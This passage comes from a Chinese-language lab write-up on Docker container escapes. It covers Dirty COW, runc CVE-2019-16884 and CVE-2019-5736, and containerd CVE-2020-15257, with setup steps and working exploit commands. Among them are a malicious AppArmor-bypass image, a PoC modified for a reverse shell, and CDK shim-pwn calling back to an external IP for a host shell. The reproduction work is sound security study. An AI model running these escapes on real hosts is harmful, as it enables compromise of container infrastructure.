sudo curl -L "https://get.daocloud.io/docker/compose/releases/download/1.27.3/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose

# 修改docker-compose文件夹权限
chmod +x /usr/local/bin/docker-compose
```
运行测试容器
```bash
cd dirtycow-docker-vdso/
sudo docker-compose run dirtycow /bin/bash
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666148730895-d1376ab2-48a4-4368-bd09-9c661eccbf1b.png#averageHue=%23300a25&clientId=ua2b2fa46-a8c3-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=307&id=u6c137522&margin=%5Bobject%20Object%5D&name=image.png&originHeight=460&originWidth=716&originalType=binary&ratio=1&rotation=0&showTitle=false&size=81764&status=error&style=none&taskId=u2dc49547-5fc2-407e-81fc-954efc85f2e&title=&width=477.3333333333333)
起docker的时候可能会因为网络环境问题无法git clone这时候可以先把Dockerfile中这三行删除掉，手动下载并移动到docker中
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666160724693-808b8494-276e-4b5c-bf85-034fdf72afe5.png#averageHue=%23f9f1f0&clientId=udb4687ae-39f7-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=182&id=ub77e0056&margin=%5Bobject%20Object%5D&name=image.png&originHeight=273&originWidth=499&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13925&status=error&style=none&taskId=u168d8051-4222-4197-b5eb-1e50deafba2&title=&width=332.6666666666667)
进入容器编译并执行
```bash
cd /dirtycow-vdso/
make
./0xdeadbeef 443.142.177.224:80
```
失败了...
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666164010468-6e0bb652-ab9f-4497-9944-d1a7f421eb4d.png#averageHue=%23351b3e&clientId=udb4687ae-39f7-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=463&id=u2ec8c409&margin=%5Bobject%20Object%5D&name=image.png&originHeight=695&originWidth=1577&originalType=binary&ratio=1&rotation=0&showTitle=false&size=496573&status=error&style=none&taskId=ufcfef6cc-0c67-42b6-9228-1321e117446&title=&width=1051.3333333333333)

---

| 逃逸漏洞\\影响版本 | 内核发行版本 | docker  | runc  | containerd  |
| --- | --- | --- | --- | --- |
| CVE-2016-5195 | 2.6.22 <= 版本 <= 4.8.3 |  |  |  |
| CVE-2019-5736 | 
 | <=18.09.2 | <=1.0-rc6 |  |
| CVE-2019-16884 |  |  | <= 1.0.0-rc8  |  |
| CVE-2020-14386 | 4.6 <= 版本 < 5.9 |  |  |  |
| CVE-2020-15257 |  |  | 
 | < 1.4.3
< 1.3.9 |
| CVE-2022-0847 | 5.8 <= 版本 < 5.10.102 < 版本 < 5.15.25 < 版本 < 5.16.11 |  |  |  |


## [自身漏洞]CVE-2019-16884
###  runc简介
 runc是一个根据OCI规范实现的CLI工具，用于生成和运行容器，docker的runtime使用的就是runc。
###  漏洞简介
 在容器镜像中可以声明一个VOLUME,挂载至/proc,欺骗runc使其认为AppArmor已经成功应用，从而绕过AppArmor策略。这个漏洞由AdamIwaniuk([https://twitter.com/adam_iwaniuk/)](https://twitter.com/adam_iwaniuk/))发现，并在DragonSectorCTF2019([https://ctftime.org/task/9279)](https://ctftime.org/task/9279))期间披露。
这个CTF题目挑战将一个文件挂载到/flag，并使用AppArmor策略拒绝访问该文件。选手可以利用([https://twitter.com/adam_iwaniuk/status/1175741830136291328)](https://twitter.com/adam_iwaniuk/status/1175741830136291328))这个漏洞来禁用这个策略并读取文件。
###  影响版本 
 **runc <= 1.0.0-rc8 **
**修复版本：1.0.0-rc9**
###  环境搭建
 由于方便本次环境搭建在docker中ubuntu主机中
（ubuntu将成为宿主机相当于在Docker中起docker）
 宿主机启动docker环境
```bash
docker run -ti ssst0n3/docker_archive:CVE-2019-16884
...
ubuntu login: root
Password: root
...
root@ubuntu:~# 
```
PS：配置docker pull源
```bash
# 编辑/etc/docker/daemon.json文件(没有该文件就创建)，中加下面参数(注意json串的格式)：
vim /etc/docker/daemon.json
{
  "registry-mirrors": ["https://docker.mirrors.ustc.edu.cn", "http://hub-mirror.c.163.com", "https://registry.docker-cn.com"]
}

# 重启docker服务
systemctl restart docker
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666172012679-ac14ead6-7111-4b4a-9abf-296213722abe.png#averageHue=%23242b37&clientId=u805561fc-2ca3-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=389&id=u242a8f35&margin=%5Bobject%20Object%5D&name=image.png&originHeight=583&originWidth=878&originalType=binary&ratio=1&rotation=0&showTitle=false&size=206487&status=error&style=none&taskId=ue6326495-fb5b-40a7-b40e-ed4c4c75046&title=&width=585.3333333333334)
登录进ubuntu中
```bash
ubuntu login:root
Password:root
```
创建apparmor规则
```bash
cat > /etc/apparmor.d/no_flag <<EOF
#include <tunables/global>

profile no_flag flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>
  file,
  deny /flag r,
}
EOF
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666172235446-ddd104b0-1388-49d8-9a48-11a651679ee7.png#averageHue=%23252d39&clientId=u805561fc-2ca3-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=223&id=u21c98f5e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=334&originWidth=568&originalType=binary&ratio=1&rotation=0&showTitle=false&size=92183&status=error&style=none&taskId=u76809caf-50eb-4ef3-87dc-265a8922015&title=&width=378.6666666666667)
应用规则
```bash
/sbin/apparmor_parser --replace --write-cache /etc/apparmor.d/no_flag 
```
宿主机创建/tmp/flag/1.txt文件
```bash
cd /tmp
echo success > flag
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666232523661-a7eb998e-0592-413c-834d-71cc307bdf18.png#averageHue=%23272f3d&clientId=u06ae1e32-9728-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=97&id=u1d305cab&margin=%5Bobject%20Object%5D&name=image.png&originHeight=146&originWidth=666&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52274&status=error&style=none&taskId=uc8a03ac1-0391-4c45-a804-673aed58486&title=&width=444)
启动一个正常镜像，无权限读取/flag内容
```bash
docker run --rm --security-opt "apparmor=no_flag" -v /tmp/flag:/flag busybox cat /flag

# output:
cat: can't open '/flag': Permission denied 
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666232619356-f0ff7751-fc27-478e-932b-0f9f5d9df9b2.png#averageHue=%23262f3c&clientId=u06ae1e32-9728-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=39&id=u10347246&margin=%5Bobject%20Object%5D&name=image.png&originHeight=58&originWidth=820&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24935&status=error&style=none&taskId=u9684a387-ce55-4b6a-bddf-b36a7763fde&title=&width=546.6666666666666)
利用漏洞启用一个恶意镜像，可以读取/flag
```bash
mkdir -p rootfs/proc/self/{attr,fd}
touch rootfs/proc/self/{status,attr/exec}
touch rootfs/proc/self/fd/{4,5}
cat <<EOF > Dockerfile 
FROM busybox 
ADD rootfs / 
VOLUME /proc 
EOF 


docker build -t apparmor-bypass . 
```
逃逸成功，成功读取宿主机文件
```bash
docker run --rm --security-opt "apparmor=no_flag" -v /tmp/flag:/flag apparmor-bypass cat /flag

# output
success
docker: Error response from daemon: cannot start a stopped process: unknown.
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666232920371-0bb70aaf-b76b-4db2-81d3-94cb8e2f5f59.png#averageHue=%23252e3b&clientId=u06ae1e32-9728-4&crop=0&crop=0&crop=1&crop=0.9916&errorMessage=unknown%20error&from=paste&height=239&id=u981595b9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=358&originWidth=825&originalType=binary&ratio=1&rotation=0&showTitle=false&size=148485&status=error&style=none&taskId=u691a5b4c-cc7f-4c85-877a-89b7e004bbc&title=&width=550)
### 漏洞原理


## [自身漏洞]CVE-2019-5736
### 漏洞原理
runc 在使用文件系统描述符时存在漏洞，该漏洞可导致特权容器被利用，造成容器逃逸以及访问宿主机文件系统；攻击者也可以使用恶意镜像，或修改运行中的容器内的配置来利用此漏洞。

攻击方式1：（该途径无需特权容器）运行中的容器被入侵，系统文件被恶意篡改 ==> 宿主机运行docker exec命令，在该容器中创建新进程 ==> 宿主机runc被替换为恶意程序 ==> 宿主机执行docker run/exec 命令时触发执行恶意程序；

攻击方式2：（该途径无需特权容器）docker run命令启动了被恶意修改的镜像 ==> 宿主机runc被替换为恶意程序 ==> 宿主机运行docker run/exec命令时触发执行恶意程序。

当runc在容器内执行新的程序时，攻击者可以欺骗它执行恶意程序。通过使用自定义二进制文件替换容器内的目标二进制文件来实现指回 runc 二进制文件。

如果目标二进制文件是 /bin/bash，可以用指定解释器的可执行脚本替换 #!/proc/self/exe。因此，在容器内执行 /bin/bash，/proc/self/exe 的目标将被执行，将目标指向 runc 二进制文件。

然后攻击者可以继续写入 /proc/self/exe 目标，尝试覆盖主机上的 runc 二进制文件。这里需要使用 O_PATH flag打开 /proc/self/exe 文件描述符，然后以 O_WRONLY flag 通过/proc/self/fd/重新打开二进制文件，并且用单独的一个进程不停地写入。当写入成功时，runc会退出。
### 利用条件
**影响版本**
docker version <=18.09.2 && RunC version <=1.0-rc6
需要在容器内拥有 root (uid 0)
### 环境搭建
```bash
# 卸载已有版本
yum remove docker \
                  docker-client \
                  docker-client-latest \
                  docker-common \
                  docker-latest \
                  docker-latest-logrotate \
                  docker-logrotate \
                  docker-engine
```
```bash
# 为了方便添加软件源，支持 devicemapper 存储类型，安装如下软件包
yum update
yum install -y yum-utils device-mapper-persistent-data lvm2

# 添加 Docker 稳定版本的 yum 软件源
yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo

# 列出可用版本
yum list docker-ce --showduplicates | sort -r
yum update
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666252093827-1f94d30e-70c3-48eb-b5a8-7853cec09b2c.png#averageHue=%23060503&clientId=ueebe6fa1-104f-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=223&id=u998c670e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=335&originWidth=1043&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31527&status=error&style=none&taskId=u61ed3f04-6d41-4fdc-9577-630af4b9321&title=&width=695.3333333333334)
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666253210863-e2716374-1d5f-461a-8f9b-bc55f99a6fa6.png#averageHue=%2316120e&clientId=uda7e8c30-3dfd-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=375&id=ud736726f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=562&originWidth=580&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59884&status=error&style=none&taskId=u2ba63997-d71f-4194-b12b-7f87c8094de&title=&width=386.6666666666667)
```bash
# 安装有漏洞版本<=18.09.2，这里选择18.06.0.ce-3.el7版本
yum install docker-ce-18.06.0.ce-3.el7 -y
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666254177549-693e33f7-4df5-4bcf-b979-329f7296e530.png#averageHue=%23080503&clientId=uda7e8c30-3dfd-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=117&id=uf0058fd8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=176&originWidth=1006&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16424&status=error&style=none&taskId=u2e30e5b9-bdbd-42d2-b13c-62ce07c8b9e&title=&width=670.6666666666666)
### 漏洞复现
在受害主机启动一个容器
```bash
docker pull nginx
docker run --name nginx-test -p 8080:80 -d nginx
docker ps -a
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666255089461-59ed5d7a-c8c4-4aa3-b07c-0d4174fd7157.png#averageHue=%23080605&clientId=uda7e8c30-3dfd-4&crop=0&crop=0.0119&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=169&id=udb094462&margin=%5Bobject%20Object%5D&name=image.png&originHeight=253&originWidth=1021&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26270&status=error&style=none&taskId=udf0c8638-aa58-48ac-bca1-b678930da80&title=&width=681)
#### 编译payload
编译go脚本生成攻击payload
```bash
# 下载POC：
https://github.com/Frichetten/CVE-2019-5736-PoC

# 修改Payload中的内容，写入一个反弹Shell的代码，其中打码部分是我服务器的IP

# 切换到root用户或以root用户身份编译main.go文件
sudo CGO_ENABLED=0 GOOS=linux GOARCH=amd64  go build main.go
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666259195174-75483d88-daf4-446e-83a5-4c16b4e0f9af.png#averageHue=%230f0b0a&clientId=uda7e8c30-3dfd-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=387&id=uc6e8bc50&margin=%5Bobject%20Object%5D&name=image.png&originHeight=581&originWidth=565&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29616&status=error&style=none&taskId=uca27e0f5-1be7-47b4-b8a7-948f9623caf&title=&width=376.6666666666667)![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666256455413-edab1008-a37d-4e4a-b53a-18a898a7da3f.png#averageHue=%23070503&clientId=uda7e8c30-3dfd-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=86&id=u50e2c700&margin=%5Bobject%20Object%5D&name=image.png&originHeight=129&originWidth=517&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8015&status=error&style=none&taskId=ubc286336-e8ab-4722-89f8-443a444061c&title=&width=344.6666666666667)
#### 容器内执行payload
将该payload通过docker cp拷贝到docker容器中（此时可以模拟攻击者获取了docker容器权限，在容器中上传payload进行docker逃逸） 并执行
```bash
docker cp main 2a7d:/home
docker exec -it 2a7d /bin/bash
cd /home/
chmod 777 main
./main
```
之后宿主机再次exec启动docker,观察容器中
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666265273069-f23937db-d90f-4081-8c08-5137982aa1a2.png#averageHue=%232b2321&clientId=uda7e8c30-3dfd-4&crop=0&crop=0&crop=0.6679&crop=0.9286&errorMessage=unknown%20error&from=paste&height=84&id=uea2b6e52&margin=%5Bobject%20Object%5D&name=image.png&originHeight=126&originWidth=530&originalType=url&ratio=1&rotation=0&showTitle=false&size=11394&status=error&style=none&taskId=ubb995387-7c81-40c2-a5aa-726b0cfa506&title=&width=354)
vps成功收到反弹shell
#### 逃逸成功
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666259109958-34c2adef-4922-4f32-90f1-45c173c2693d.png#averageHue=%23191614&clientId=uda7e8c30-3dfd-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=406&id=ub40d0f21&margin=%5Bobject%20Object%5D&name=image.png&originHeight=609&originWidth=1539&originalType=binary&ratio=1&rotation=0&showTitle=false&size=102249&status=error&style=none&taskId=u0ef5124c-62bb-423e-9d73-a7974cd269e&title=&width=1026)
### 后记
这个漏洞打了可能就回不去了......慎用


## [自身漏洞] CVE-2020-15257
### 漏洞原理
containerd是行业标准的容器运行时，可作为Linux和Windows的守护程序使用。在版本1.3.9和1.4.3之前的容器中，容器填充的API不正确地暴露给主机网络容器。填充程序的API套接字的访问控制验证了连接过程的有效UID为0，但没有以其他方式限制对抽象Unix域套接字的访问。这将允许在与填充程序相同的网络名称空间中运行的恶意容器（有效UID为0，但特权降低）导致新进程以提升的特权运行。
### 影响版本
```bash
containerd < 1.4.3
containerd < 1.3.9
```
### 环境搭建
**kali 2021~Centos7.6**
更新apt源
```bash
# 添加 Docker 稳定版本的 yum 软件源
yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo
yum clean all
yum makecache
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666581348302-c8b42a34-ac4c-4d17-8121-7d45c84e5186.png#averageHue=%23070605&clientId=u3260bc43-055a-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=331&id=u84d344e3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=496&originWidth=1381&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51038&status=error&style=none&taskId=u09b43e3f-7aa2-4c89-a3f2-d0107389327&title=&width=920.6666666666666)
安装有漏洞的containerd版本
```bash
yum install -y docker-ce-18.09.6-3.el7 docker-ce-cli-19.03.6-3.el7 containerd.io-1.2.4-3.1.el7
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666582436383-b4caa3e1-bdbe-406a-9dde-b9b6bd56c525.png#averageHue=%23050302&clientId=u3260bc43-055a-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=225&id=u5f48751b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=337&originWidth=1022&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29460&status=error&style=none&taskId=u1b156783-41f6-4303-b33d-1e8a259dea5&title=&width=681.3333333333334)
### 漏洞复现
#### 下载容器
```bash
docker pull ubuntu:18.04
```
通过--net=host 作为启动参数来运行一个容器
```bash
sudo docker run -itd --net=host ubuntu:18.04 /bin/bash
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666582513837-10643d8f-2b39-47fd-ad7e-b7e3849d213c.png#averageHue=%2315100b&clientId=u3260bc43-055a-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=33&id=ubd956fb3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=49&originWidth=549&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5014&status=error&style=none&taskId=u88facc91-c6f4-4eeb-987b-5c1b636c2c1&title=&width=366)
查看当前运行中的容器，记下id 85022e12e612
```bash
docker ps -a
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666582548203-e3e7255a-1289-4e8e-8dc5-1f412197d4a7.png#averageHue=%23070504&clientId=u3260bc43-055a-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=47&id=u97e6e63c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=71&originWidth=927&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6432&status=error&style=none&taskId=ue5db9546-e730-42fb-bec4-6c056497eee&title=&width=618)
#### 下载EXP
[https://github.com/cdk-team/CDK/releases/tag/0.1.6](https://github.com/cdk-team/CDK/releases/tag/0.1.6)
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666582737561-d715847c-ffe8-4119-b1f1-8dc586256c69.png#averageHue=%23fefefe&clientId=u3260bc43-055a-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=411&id=u1f09240f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=617&originWidth=1797&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63955&status=error&style=none&taskId=u7728a210-46a7-4201-90c6-b061a9faea5&title=&width=1198)
将下载好的压缩包解压，然后copy进docker容器
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666583059961-9ead9b2b-fab8-4a3e-9493-9fa043d51621.png#averageHue=%230c0806&clientId=u3260bc43-055a-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=132&id=u3c580d18&margin=%5Bobject%20Object%5D&name=image.png&originHeight=198&originWidth=480&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14446&status=error&style=none&taskId=ue475dd63-3b9a-447f-9d1e-aaf18a63450&title=&width=320)
#### 执行EXP
进入容器bash
在容器内执行exp，攻击机设置监听
```bash
docker exec -it 85022 /bin/bash

./cdk_linux_amd64 run shim-pwn 43.142.177.224 80
```
#### 逃逸成功
成功完成逃逸获得宿主机的shell
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666582992940-91545abe-1486-4236-94f3-581d1acd36e2.png#averageHue=%23161211&clientId=u3260bc43-055a-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=387&id=u63709167&margin=%5Bobject%20Object%5D&name=image.png&originHeight=581&originWidth=1018&originalType=binary&ratio=1&rotation=0&showTitle=false&size=79029&status=error&style=none&taskId=u9ed0165f-0ef6-449b-aeee-f7f1c7a7a22&title=&width=678.6666666666666)
